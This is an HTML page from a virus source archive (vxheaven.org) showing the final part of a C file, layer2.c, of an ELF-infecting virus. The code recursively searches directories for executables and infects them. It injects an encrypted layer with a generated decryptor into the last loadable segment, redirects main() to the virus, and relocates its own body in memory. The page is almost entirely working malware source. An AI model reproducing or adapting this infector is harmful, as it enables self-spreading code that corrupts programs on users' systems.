	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>ph <span style="color: #339933;">=</span> find_last_PT_LOAD<span style="color: black;">&#40;</span>ehdr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _unmap<span style="color: #339933;">;</span>
	layer2_offs <span style="color: #339933;">=</span> ph<span style="color: #339933;">-&gt;</span>p_offset <span style="color: #339933;">+</span> ph<span style="color: #339933;">-&gt;</span>p_filesz<span style="color: #339933;">;</span>
	layer2_addr <span style="color: #339933;">=</span> ph<span style="color: #339933;">-&gt;</span>p_vaddr <span style="color: #339933;">+</span> ph<span style="color: #339933;">-&gt;</span>p_filesz<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>layer2_entry <span style="color: #339933;">=</span> find_pmain<span style="color: black;">&#40;</span>ehdr<span style="color: #339933;">,</span> shdr<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">goto</span> _unmap<span style="color: #339933;">;</span>
	tl <span style="color: #339933;">=</span> g<span style="color: #339933;">-&gt;</span>layer2_size <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span>
	buf <span style="color: #339933;">=</span> sbrk<span style="color: black;">&#40;</span>tl <span style="color: #339933;">+</span> <span style="color: #0000dd;">4096</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	src <span style="color: #339933;">=</span> sbrk<span style="color: black;">&#40;</span>tl<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>src<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>g<span style="color: #339933;">-&gt;</span>layer2_addr<span style="color: #339933;">,</span> g<span style="color: #339933;">-&gt;</span>layer2_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>src <span style="color: #339933;">+</span> <span style="color: #0000dd;">6</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: #339933;">*</span>layer2_entry<span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* save old main() address */</span>
	<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>src <span style="color: #339933;">+</span> g<span style="color: #339933;">-&gt;</span>layer2_size<span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> layer1_entry<span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span><span style="color: #339933;">;</span> <span style="color: #808080; font-style: italic;">/* save new layer1 address */</span>
	dl <span style="color: #339933;">=</span> make_decryptor<span style="color: black;">&#40;</span>buf<span style="color: #339933;">,</span> src<span style="color: #339933;">,</span> layer2_addr<span style="color: #339933;">,</span> tl<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	MAKE_HOLE<span style="color: black;">&#40;</span>layer2_offs<span style="color: #339933;">,</span> dl<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span>m <span style="color: #339933;">+</span> layer2_offs<span style="color: #339933;">,</span> buf<span style="color: #339933;">,</span> dl<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	ph<span style="color: #339933;">-&gt;</span>p_filesz <span style="color: #339933;">+=</span> dl<span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>ph<span style="color: #339933;">-&gt;</span>p_memsz <span style="color: #339933;">&lt;</span> ph<span style="color: #339933;">-&gt;</span>p_filesz<span style="color: black;">&#41;</span>
		ph<span style="color: #339933;">-&gt;</span>p_memsz <span style="color: #339933;">=</span> ph<span style="color: #339933;">-&gt;</span>p_filesz<span style="color: #339933;">;</span>
	ph<span style="color: #339933;">-&gt;</span>p_flags <span style="color: #339933;">|=</span> PF_X <span style="color: #339933;">|</span> PF_R<span style="color: #339933;">;</span>
	ph<span style="color: #339933;">-&gt;</span>p_align <span style="color: #339933;">=</span> <span style="color: #208080;">0x1000</span><span style="color: #339933;">;</span>
	SHIFT_SHDRS<span style="color: black;">&#40;</span>layer2_offs<span style="color: #339933;">,</span> dl<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #339933;">*</span>layer2_entry <span style="color: #339933;">=</span> layer2_addr <span style="color: #339933;">+</span> tl <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: #339933;">;</span>	<span style="color: #808080; font-style: italic;">/* +4 for length, see make_decryptor */</span>
	brk<span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>savebrk<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>lastbrk <span style="color: #339933;">=</span> g<span style="color: #339933;">-&gt;</span>savebrk<span style="color: #339933;">;</span>
&nbsp;
	m<span style="color: black;">&#91;</span><span style="color: #0000dd;">15</span><span style="color: black;">&#93;</span><span style="color: #339933;">++;</span>
_unmap<span style="color: #339933;">:</span>	munmap<span style="color: black;">&#40;</span>m<span style="color: #339933;">,</span> l<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
_close<span style="color: #339933;">:</span>	close<span style="color: black;">&#40;</span>h<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #993333;">static</span> <span style="color: #993333;">void</span> search<span style="color: black;">&#40;</span><span style="color: #993333;">char</span> <span style="color: #339933;">*</span>dir_name<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	<span style="color: #993333;">struct</span> stat sbuf<span style="color: #339933;">;</span>
	<span style="color: #993333;">struct</span> dirent d<span style="color: #339933;">;</span>
	<span style="color: #993333;">int</span> h<span style="color: #339933;">;</span>
	<span style="color: #993333;">char</span> ddot<span style="color: black;">&#91;</span><span style="color: #0000dd;">3</span><span style="color: black;">&#93;</span> <span style="color: #339933;">=</span> <span style="color: black;">&#123;</span> <span style="color: #ff0000;">'.'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">'.'</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">'<span style="color: #006699; font-weight: bold;">\0</span>'</span> <span style="color: black;">&#125;</span><span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>dir_name <span style="color: #339933;">==</span> NULL<span style="color: black;">&#41;</span>
		dir_name <span style="color: #339933;">=</span> ddot <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>h <span style="color: #339933;">=</span> open<span style="color: black;">&#40;</span>dir_name<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: #339933;">&lt;</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
		<span style="color: #b1b100;">return</span><span style="color: #339933;">;</span>
	<span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span>readdir<span style="color: black;">&#40;</span>h<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>d<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>d.<span style="color: #202020;">d_name</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #ff0000;">'.'</span><span style="color: black;">&#41;</span>
			<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>d.<span style="color: #202020;">d_name</span><span style="color: black;">&#91;</span><span style="color: #0000dd;">1</span><span style="color: black;">&#93;</span> <span style="color: #339933;">==</span> <span style="color: #ff0000;">'<span style="color: #006699; font-weight: bold;">\0</span>'</span> <span style="color: #339933;">||</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint16_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>d.<span style="color: #202020;">d_name</span> <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #208080;">0x2e</span><span style="color: black;">&#41;</span>
				<span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span>
		lstat<span style="color: black;">&#40;</span>d.<span style="color: #202020;">d_name</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>sbuf<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>S_ISLNK<span style="color: black;">&#40;</span>sbuf.<span style="color: #202020;">st_mode</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span>
			<span style="color: #b1b100;">continue</span><span style="color: #339933;">;</span>
		<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>chdir<span style="color: black;">&#40;</span>d.<span style="color: #202020;">d_name</span><span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span>
			search<span style="color: black;">&#40;</span>ddot <span style="color: #339933;">+</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
			chdir<span style="color: black;">&#40;</span>ddot<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		<span style="color: black;">&#125;</span> <span style="color: #b1b100;">else</span> <span style="color: black;">&#123;</span>
			<span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>access<span style="color: black;">&#40;</span>d.<span style="color: #202020;">d_name</span><span style="color: #339933;">,</span> X_OK<span style="color: black;">&#41;</span> <span style="color: #339933;">==</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span>
				infect<span style="color: black;">&#40;</span>d.<span style="color: #202020;">d_name</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
		<span style="color: black;">&#125;</span>
	<span style="color: black;">&#125;</span>
	close<span style="color: black;">&#40;</span>h<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
&nbsp;
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">void</span> layer1<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">void</span> layer1_e<span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #993333;">void</span> virus<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> esp<span style="color: black;">&#41;</span>
<span style="color: black;">&#123;</span>
	globals glob<span style="color: #339933;">;</span>
	g <span style="color: #339933;">=</span> <span style="color: #339933;">&amp;</span>glob<span style="color: #339933;">;</span>
&nbsp;
	<span style="color: #808080; font-style: italic;">/* setup data */</span>
	g<span style="color: #339933;">-&gt;</span>layer2_addr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span>__builtin_return_address<span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">-</span> <span style="color: #0000dd;">5</span><span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>layer2_size <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>virus_end <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>virus_start<span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>layer1_addr <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>layer2_addr <span style="color: #339933;">+</span> g<span style="color: #339933;">-&gt;</span>layer2_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>layer1_size <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>layer1_e <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>layer1<span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>random <span style="color: #339933;">=</span> g<span style="color: #339933;">-&gt;</span>layer2_addr <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>random <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>virus_start<span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>trash <span style="color: #339933;">=</span> g<span style="color: #339933;">-&gt;</span>layer2_addr <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>trash <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span><span style="color: #339933;">&amp;</span>virus_start<span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>seed <span style="color: #339933;">=</span> <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/time.html"><span style="color: #000066;">time</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span> <span style="color: #339933;">^</span> getpid<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	g<span style="color: #339933;">-&gt;</span>lastbrk <span style="color: #339933;">=</span> NULL<span style="color: #339933;">;</span>
	search<span style="color: black;">&#40;</span>NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #993333;">uint32_t</span> sz <span style="color: #339933;">=</span> <span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>layer2_addr <span style="color: #339933;">+</span> g<span style="color: #339933;">-&gt;</span>layer2_size <span style="color: #339933;">+</span> <span style="color: #0000dd;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">#ifdef	DEBUG	</span>
	putx4<span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>layer1_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/putc.html"><span style="color: #000066;">putc</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">' '</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	putx4<span style="color: black;">&#40;</span>g<span style="color: #339933;">-&gt;</span>layer2_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/putc.html"><span style="color: #000066;">putc</span></a><span style="color: black;">&#40;</span><span style="color: #ff0000;">' '</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	putx4<span style="color: black;">&#40;</span>sz<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/putc.html"><span style="color: #000066;">putc</span></a><span style="color: black;">&#40;</span><span style="color: #0000dd;">10</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: #339933;">#endif</span>
	<span style="color: #808080; font-style: italic;">/* move itself to the new memory location */</span>
	<span style="color: #993333;">uint32_t</span> nloc<span style="color: #339933;">;</span>
	nloc <span style="color: #339933;">=</span> mmap<span style="color: black;">&#40;</span>NULL<span style="color: #339933;">,</span> g<span style="color: #339933;">-&gt;</span>layer2_size<span style="color: #339933;">,</span> PROT_READ<span style="color: #339933;">|</span>PROT_WRITE<span style="color: #339933;">,</span> MAP_PRIVATE<span style="color: #339933;">|</span>MAP_ANONYMOUS<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/memcpy.html"><span style="color: #000066;">memcpy</span></a><span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>nloc<span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>g<span style="color: #339933;">-&gt;</span>layer2_addr<span style="color: #339933;">,</span> g<span style="color: #339933;">-&gt;</span>layer2_size<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	mprotect<span style="color: black;">&#40;</span>nloc<span style="color: #339933;">,</span> g<span style="color: #339933;">-&gt;</span>layer2_size<span style="color: #339933;">,</span> PROT_READ<span style="color: #339933;">|</span>PROT_EXEC<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	asm <span style="color: #993333;">volatile</span> <span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;leal 1f-virus_start(%0),%%eax; jmp *%%eax; 1:&quot;</span><span style="color: #339933;">::</span> <span style="color: #ff0000;">&quot;r&quot;</span><span style="color: black;">&#40;</span>nloc<span style="color: black;">&#41;</span><span style="color: #339933;">:</span><span style="color: #ff0000;">&quot;%eax&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* clean .bss area */</span>
	bzero<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>g<span style="color: #339933;">-&gt;</span>layer2_addr<span style="color: #339933;">,</span> sz<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
	<span style="color: #808080; font-style: italic;">/* adjust return address */</span>
	<span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>esp <span style="color: #339933;">-</span> <span style="color: #0000dd;">1</span><span style="color: black;">&#41;</span> <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>nloc <span style="color: #339933;">+</span> <span style="color: #0000dd;">5</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
<span style="color: black;">&#125;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;virus_end:&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.long layer1&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>	<span style="color: #808080; font-style: italic;">/* address of layer 1 */</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.long 0&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>		<span style="color: #808080; font-style: italic;">/* size of virus + decryptor */</span>
asm<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;.globl main; main: jmp virus_start&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>
&nbsp;</pre></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/src_view.php?lang=de&amp;file=42.zip&amp;view=layer2.c">de</a><a href="/src_view.php?lang=en&amp;file=42.zip&amp;view=layer2.c">en</a><a href="/src_view.php?lang=es&amp;file=42.zip&amp;view=layer2.c">es</a><a href="/src_view.php?lang=it&amp;file=42.zip&amp;view=layer2.c">it</a><a href="/src_view.php?lang=fr&amp;file=42.zip&amp;view=layer2.c">fr</a><a href="/src_view.php?lang=pl&amp;file=42.zip&amp;view=layer2.c">pl</a><a href="/src_view.php?lang=ru&amp;file=42.zip&amp;view=layer2.c">ru</a><a href="/src_view.php?lang=ua&amp;file=42.zip&amp;view=layer2.c">ua</a></div>
</body>
</html>
